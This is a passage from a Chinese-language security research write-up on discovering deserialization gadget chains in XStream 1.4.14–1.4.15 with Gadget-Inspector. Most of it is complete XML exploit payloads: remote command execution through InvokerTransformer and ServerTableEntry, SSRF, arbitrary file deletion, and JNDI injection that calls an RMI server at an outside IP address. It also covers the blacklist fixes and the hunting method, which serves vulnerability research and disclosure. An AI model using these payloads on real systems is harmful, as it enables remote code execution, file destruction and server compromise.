                                                                <java-class>[Ljava.lang.Object;</java-class>
                                                            </iParamTypes>
                                                            <iArgs>
                                                                <null/>
                                                                <object-array/>
                                                            </iArgs>
                                                        </org.apache.commons.collections4.functors.InvokerTransformer>
                                                        <org.apache.commons.collections4.functors.InvokerTransformer>
                                                            <iMethodName>exec</iMethodName>
                                                            <iParamTypes>
                                                                <java-class>java.lang.String</java-class>
                                                            </iParamTypes>
                                                            <iArgs>
                                                                <string>calc.exe</string>
                                                            </iArgs>
                                                        </org.apache.commons.collections4.functors.InvokerTransformer>
                                                    </iTransformers>
                                                </transformer>
                                            </it>
                                        </msg>
                                    </part>
                                </dataHead>
                            </mimePart>
                        </part>
                    </dataSource>

                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

后面又仔细想了一下，循环反射是因为ProcessBuilder与Runtime没有实现反序列化接口，导致无法反序列化，XStream没有这个限制，在ProcessBuilder被禁止的情况下，可以实例化Runtime，直接RCE。改了改之后POC变为如下

```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePartDataSource'>
                        <part>
                            <mimePart>
                                <dataHead>
                                    <part>
                                        <msg>
                                            <it class="org.apache.commons.collections4.iterators.ObjectGraphIterator">
                                                <stack class="java.util.ArrayDeque" serialization="custom">
                                                    <unserializable-parents/>
                                                    <java.util.ArrayDeque>
                                                        <default/>
                                                        <int>0</int>
                                                    </java.util.ArrayDeque>
                                                </stack>
                                                <root class="java.lang.Runtime">

                                                </root>
                                                <transformer class="org.apache.commons.collections4.functors.InvokerTransformer">
                                                    <iMethodName>exec</iMethodName>
                                                    <iParamTypes>
                                                        <java-class>java.lang.String</java-class>
                                                    </iParamTypes>
                                                    <iArgs>
                                                        <string>calc.exe</string>
                                                    </iArgs>
                                                </transformer>
                                            </it>
                                        </msg>
                                    </part>
                                </dataHead>
                            </mimePart>
                        </part>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

#### 修复

将FileStream与NativeString加入了黑名单。

![image-20210119115303034](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119115303034.png)

### XStream 1.4.15

#### 新的source寻找

在1.4.15已经将NativeString加入了黑名单。但是MapConverter的处理逻辑没变，还是可以将Object.hashcode作为source入口。找遍了jdk中所有的Object.hashcode函数也没找到可用的一个source。这时候联想了一下以前分析过常见的几条jdk反序列化链，试着反序列化一下优先队列是什么情况？

构造一个优先队列，用XStream反序列化之后，输出xml。

```java
        Queue<String> q = new PriorityQueue<>();
        q.offer("apple");
        XStream xStream = new XStream();
        System.out.println(xStream.toXML(q));
```

输出的xml为

```xml
<java.util.PriorityQueue serialization="custom">
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>1</size>
    </default>
    <int>2</int>
    <string>apple</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>

```

然后再用XStream反序列化回去，打好断点。你会看到居然调用了优先队列的readObject函数。

![image-20210119135705897](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119135705897.png)

详细跟进之后可以发现XStream在反序列化优先队列时，会交由SerializableConverter处理。

SerializableConverter实现中会判断反序列化的对象是否支持传统意义上的jdk反序列化，如果支持的话就调用这个对象的readObject函数。

![image-20210119140107580](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119140107580.png)

这同时也就意味着可以用beanutils的gadget打jndi注入。但这并不是我们想要的。

稍微调试一下当初beanutils的调用链

![image-20210119140735367](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119140735367.png)

在siftDownUsingComparator函数中会调用Comparator.compare，Comparator是可控的。所以我们可以将Comparator.compare作为新的source。

![image-20210119140814605](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119140814605.png)

定制source如下，但是发现得到的结果都是无用链。

```java
                if(inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle("java/util/Comparator"))&&(method.getName().equals("compare"))){
                    addDiscoveredSource(new Source(method, 0));
                }
```

原因其实也很简单，就是参数污染误报+BFS导致错过了真正的source。打开source.dat之后发现，source才160多个，采用人工排查的方式不用花多少时间，于是开始人工排查。当排查到DataTransferer$IndexOrderComparator.compare方法时，发现可以产生map.get(Object)的新source。

后续以Map.get寻找新的source，结果可以发现老面孔又来了。

#### 发现的Gadget链

##### SSRF

```xml
<java.util.PriorityQueue serialization="custom">
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
            <comparator class="sun.awt.datatransfer.DataTransferer$IndexOrderComparator">
                <indexMap class="com.sun.xml.internal.ws.client.ResponseContext">
                    <packet>
                        <message class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart">
                            <dataSource class="javax.activation.URLDataSource">
                                <url>HTTP://127.0.0.1:9999/ssrf?a=1</url>
                            </dataSource>
                        </message>
                        <satellites></satellites>
                        <invocationProperties></invocationProperties>
                    </packet>
                </indexMap>
            </comparator>
        </default>
        <int>3</int>
        <string>javax.xml.ws.binding.attachments.inbound</string>
        <string>javax.xml.ws.binding.attachments.inbound</string>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

##### 任意文件删除

```xml
<java.util.PriorityQueue serialization="custom">
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
            <comparator class="sun.awt.datatransfer.DataTransferer$IndexOrderComparator">
                <indexMap class="com.sun.xml.internal.ws.client.ResponseContext">
                    <packet>
                        <message class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart">
                            <dataSource class="com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource">
                                <part>
                                    <dataHead>
                                        <tail/>
                                        <head>
                                            <data class="com.sun.xml.internal.org.jvnet.mimepull.MemoryData">
                                                <len>3</len>
                                                <data>AQID</data>
                                            </data>
                                        </head>
                                    </dataHead>
                                    <contentTransferEncoding>base64</contentTransferEncoding>
                                    <msg>
                                        <it class="java.util.ArrayList$Itr">
                                            <cursor>0</cursor>
                                            <lastRet>1</lastRet>
                                            <expectedModCount>4</expectedModCount>
                                            <outer-class>
                                                <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                                                <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                                                <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                                                <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>
                                            </outer-class>
                                        </it>
                                        <in class="java.io.FileInputStream">
                                            <fd/>
                                            <channel class="sun.nio.ch.FileChannelImpl">
                                                <closeLock/>
                                                <open>true</open>
                                                <threads>
                                                    <used>-1</used>
                                                </threads>
                                                <parent class="sun.plugin2.ipc.unix.DomainSocketNamedPipe">
                                                    <sockClient>
                                                        <fileName>D:\temp\1.txt</fileName>
                                                        <unlinkFile>true</unlinkFile>
                                                    </sockClient>
                                                    <connectionSync/>
                                                </parent>
                                            </channel>
                                            <closeLock/>
                                        </in>
                                    </msg>
                                </part>
                            </dataSource>
                        </message>
                        <satellites/>
                        <invocationProperties/>
                    </packet>
                </indexMap>
            </comparator>
        </default>
        <int>3</int>
        <string>javax.xml.ws.binding.attachments.inbound</string>
        <string>javax.xml.ws.binding.attachments.inbound</string>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>

```

##### jndi

Gadget-Inspector调用链输出如下。

```
  com/sun/xml/internal/ws/client/ResponseContext.get(Ljava/lang/Object;)Ljava/lang/Object; (0)
  com/sun/xml/internal/ws/encoding/xml/XMLMessage$XMLMultiPart.getAttachments()Lcom/sun/xml/internal/ws/api/message/AttachmentSet; (0)
  com/sun/xml/internal/ws/encoding/xml/XMLMessage$XMLMultiPart.getMessage()Lcom/sun/xml/internal/ws/api/message/Message; (0)
  com/sun/xml/internal/ws/message/JAXBAttachment.getInputStream()Ljava/io/InputStream; (0)
  com/sun/xml/internal/ws/message/JAXBAttachment.asInputStream()Ljava/io/InputStream; (0)
  com/sun/xml/internal/ws/message/JAXBAttachment.writeTo(Ljava/io/OutputStream;)V (0)
  com/sun/xml/internal/ws/db/glassfish/BridgeWrapper.marshal(Ljava/lang/Object;Ljava/io/OutputStream;Ljavax/xml/namespace/NamespaceContext;Ljavax/xml/bind/attachment/AttachmentMarshaller;)V (0)
  com/sun/xml/internal/bind/api/Bridge.marshal(Ljava/lang/Object;Ljava/io/OutputStream;Ljavax/xml/namespace/NamespaceContext;Ljavax/xml/bind/attachment/AttachmentMarshaller;)V (0)
  com/sun/xml/internal/bind/v2/runtime/BridgeImpl.marshal(Ljavax/xml/bind/Marshaller;Ljava/lang/Object;Ljava/io/OutputStream;Ljavax/xml/namespace/NamespaceContext;)V (0)
  com/sun/xml/internal/bind/v2/runtime/MarshallerImpl.write(Lcom/sun/xml/internal/bind/v2/runtime/Name;Lcom/sun/xml/internal/bind/v2/runtime/JaxBeanInfo;Ljava/lang/Object;Lcom/sun/xml/internal/bind/v2/runtime/output/XmlOutput;Ljava/lang/Runnable;)V (2)
  com/sun/xml/internal/bind/v2/runtime/XMLSerializer.childAsXsiType(Ljava/lang/Object;Ljava/lang/String;Lcom/sun/xml/internal/bind/v2/runtime/JaxBeanInfo;Z)V (3)
  com/sun/xml/internal/bind/v2/runtime/ClassBeanInfoImpl.serializeAttributes(Ljava/lang/Object;Lcom/sun/xml/internal/bind/v2/runtime/XMLSerializer;)V (0)
  com/sun/xml/internal/bind/v2/runtime/reflect/NullSafeAccessor.get(Ljava/lang/Object;)Ljava/lang/Object; (0)
  com/sun/xml/internal/bind/v2/runtime/reflect/Lister$CollectionLister.startPacking(Ljava/lang/Object;Lcom/sun/xml/internal/bind/v2/runtime/reflect/Accessor;)Ljava/lang/Object; (2)
  com/sun/xml/internal/bind/v2/runtime/reflect/Lister$CollectionLister.startPacking(Ljava/lang/Object;Lcom/sun/xml/internal/bind/v2/runtime/reflect/Accessor;)Ljava/util/Collection; (2)
  com/sun/xml/internal/bind/v2/runtime/reflect/Accessor$GetterSetterReflection.set(Ljava/lang/Object;Ljava/lang/Object;)V (0)
```

观察Accessor$GetterSetterReflection.set函数可以发现，bean和value可以是任意类型，好像这条链是有戏的。

![image-20210119143716079](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119143716079.png)

再回到上一步的startPacking函数，可以看到value被强制转换为了Collection 。函数入参确定的情况下，可操作性太少。

![image-20210119144002491](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119144002491.png)

正当准备放弃的时候，看到了Accessor$GetterSetterReflection.get函数，与set函数不同的是，反射执行的是无参函数。然后再看到了调用链中NullSafeAccessor.get，都是Accessor类型，感觉可以做个替换（类型擦除的原因）。打开经过一番尝试之后就成功了。

![image-20210119144148710](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119144148710.png)

接下来就是如何利用的问题，反射无参函数想要RCE，在ProcessBuilder被禁止的情况下，很容易想到的就是之前java反序列化中被经常利用的JdbcRowSetImpl，payload如下：

```xml
<java.util.PriorityQueue serialization="custom">
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
            <comparator class="sun.awt.datatransfer.DataTransferer$IndexOrderComparator">
                <indexMap class="com.sun.xml.internal.ws.client.ResponseContext">
                    <packet>
                        <message class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart">
                            <dataSource class="com.sun.xml.internal.ws.message.JAXBAttachment">
                                <bridge class="com.sun.xml.internal.ws.db.glassfish.BridgeWrapper">
                                    <bridge class="com.sun.xml.internal.bind.v2.runtime.BridgeImpl">
                                        <bi class="com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl">
                                            <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                                            <uriProperties></uriProperties>
                                            <attributeProperties></attributeProperties>
                                            <inheritedAttWildcard class="com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection">
                                                <getter>
                                                    <class>com.sun.rowset.JdbcRowSetImpl</class>
                                                    <name>getDatabaseMetaData</name>
                                                    <parameter-types/>
                                                </getter>
                                            </inheritedAttWildcard>
                                        </bi>
                                        <tagName></tagName>
                                        <context>
                                            <marshallerPool class="com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1">
                                                <outer-class reference="../.."/>
                                            </marshallerPool>
                                            <nameList>
                                                <nsUriCannotBeDefaulted>
                                                    <boolean>true</boolean>
                                                </nsUriCannotBeDefaulted>
                                                <namespaceURIs>
                                                    <string>1</string>
                                                </namespaceURIs>
                                                <localNames>
                                                    <string>UTF-8</string>
                                                </localNames>
                                            </nameList>
                                        </context>
                                    </bridge>
                                </bridge>
                                <jaxbObject class="com.sun.rowset.JdbcRowSetImpl" serialization="custom">
                                    <javax.sql.rowset.BaseRowSet>
                                        <default>
                                            <concurrency>1008</concurrency>
                                            <escapeProcessing>true</escapeProcessing>
                                            <fetchDir>1000</fetchDir>
                                            <fetchSize>0</fetchSize>
                                            <isolation>2</isolation>
                                            <maxFieldSize>0</maxFieldSize>
                                            <maxRows>0</maxRows>
                                            <queryTimeout>0</queryTimeout>
                                            <readOnly>true</readOnly>
                                            <rowSetType>1004</rowSetType>
                                            <showDeleted>false</showDeleted>
                                            <dataSource>rmi://10.43.232.218:15000/SayHello</dataSource>
                                            <params/>
                                        </default>
                                    </javax.sql.rowset.BaseRowSet>
                                    <com.sun.rowset.JdbcRowSetImpl>
                                        <default>
                                            <iMatchColumns>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                                <int>-1</int>
                                            </iMatchColumns>
                                            <strMatchColumns>
                                                <string>foo</string>
                                                <null/>
                                                <null/>
                                                <null/>
                                                <null/>
                                                <null/>
                                                <null/>
                                                <null/>
                                                <null/>
                                                <null/>
                                            </strMatchColumns>
                                        </default>
                                    </com.sun.rowset.JdbcRowSetImpl>
                                </jaxbObject>
                            </dataSource>
                        </message>
                        <satellites/>
                        <invocationProperties/>
                    </packet>
                </indexMap>
            </comparator>
        </default>
        <int>3</int>
        <string>javax.xml.ws.binding.attachments.inbound</string>
        <string>javax.xml.ws.binding.attachments.inbound</string>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>

```

##### 直接RCE

java反序列化除了commons-collections之外，都是通过jndi注入来达到RCE的效果，究其原因，很大部分原因在于执行系统命令的两个类Runtime和ProcessBuilder都没实现序列化接口，无法进行反序列化。但XStream没有这个限制。1.4.15 ProcessBuilder已经被禁止，当前反射的又是无参函数，Runtime.exec无法利用。该如何找新的可利用的类。

寻找方法：在callgraph.dat中搜索Runtime.exec和ProcessBuilder.start

搜索到如下调用链

```
com/sun/corba/se/impl/activation/ServerTableEntry	verify	()I	java/lang/Runtime	exec	(Ljava/lang/String;)Ljava/lang/Process;	0	activationCmd	1
```

查看ServerTableEntry.verify，发现直接执行且命令可控

![image-20210119150017488](XStream 1.4.14-14.15 Gadget挖掘过程分享.assets/image-20210119150017488.png)

payload如下：

```xml
<java.util.PriorityQueue serialization="custom">
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
            <comparator class="sun.awt.datatransfer.DataTransferer$IndexOrderComparator">
                <indexMap class="com.sun.xml.internal.ws.client.ResponseContext">
                    <packet>
                        <message class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart">
                            <dataSource class="com.sun.xml.internal.ws.message.JAXBAttachment">
                                <bridge class="com.sun.xml.internal.ws.db.glassfish.BridgeWrapper">
                                    <bridge class="com.sun.xml.internal.bind.v2.runtime.BridgeImpl">
                                        <bi class="com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl">
                                            <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                                            <uriProperties></uriProperties>
                                            <attributeProperties></attributeProperties>
                                            <inheritedAttWildcard class="com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection">
                                                <getter>
                                                    <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                                                    <name>verify</name>
                                                    <parameter-types/>
                                                </getter>
                                            </inheritedAttWildcard>
                                        </bi>
                                        <tagName></tagName>
                                        <context>
                                            <marshallerPool class="com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1">
                                                <outer-class reference="../.."/>
                                            </marshallerPool>
                                            <nameList>
                                                <nsUriCannotBeDefaulted>
                                                    <boolean>true</boolean>
                                                </nsUriCannotBeDefaulted>
                                                <namespaceURIs>
                                                    <string>1</string>
                                                </namespaceURIs>
                                                <localNames>
                                                    <string>UTF-8</string>
                                                </localNames>
                                            </nameList>
                                        </context>
                                    </bridge>
                                </bridge>
                                <jaxbObject class="com.sun.corba.se.impl.activation.ServerTableEntry" >
                                    <activationCmd>calc</activationCmd>
                                </jaxbObject>
                            </dataSource>
                        </message>
                        <satellites/>
                        <invocationProperties/>
                    </packet>
                </indexMap>
            </comparator>
        </default>
        <int>3</int>
        <string>javax.xml.ws.binding.attachments.inbound</string>
        <string>javax.xml.ws.binding.attachments.inbound</string>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>

```

### 总结

由于XStream强大又危险的安全特性，且社区不对三方件的黑名单进行维护，无论产品使用什么版本的XStream，只要没开启默认安全配置，都将是不安全的，可以结合Gadget-Inspector来寻找可利用的Gadget链，同时该工具也可以用于寻找其他类型的反序列化Gadget。

### Reference

https://github.com/threedr3am/gadgetinspector

https://xz.aliyun.com/t/7063

https://xz.aliyun.com/t/7058

https://paper.seebug.org/1034/#_13

